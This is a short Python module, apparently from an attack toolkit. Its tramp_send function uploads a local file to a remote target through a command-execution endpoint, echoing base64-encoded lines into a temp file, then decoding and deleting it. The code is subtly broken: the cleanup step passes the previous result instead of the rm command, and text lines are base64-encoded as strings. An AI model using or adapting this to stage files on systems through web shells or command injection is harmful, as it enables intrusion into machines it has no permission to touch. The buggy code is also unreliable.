import sys
import base64
from .shell import run_command

def tramp_send(endpoint, dest, paramname, extraparams):
    with open(dest, 'r') as fh:
        for line in fh:
            data = base64.b64encode(line).strip()
            cmd = "echo '{0}' >> tmp.{1}".format(data, dest)
            res = run_command(cmd, endpoint, paramname=paramname, extraparams=extraparams)
            print(res)

    # easily could be turned into a loop really
    cmd = "base64 -d tmp.{0} > {0}".format(dest)
    res = run_command(cmd, endpoint, paramname=paramname, extraparams=extraparams)
    print(res)
    cmd = "rm tmp.{0}".format(dest)
    res = run_command(res, endpoint, paramname=paramname, extraparams=extraparams)
    print(res)


if __name__ == "__main__":
    print("tramp endpoint dest [parameter name] [extra parameters]")
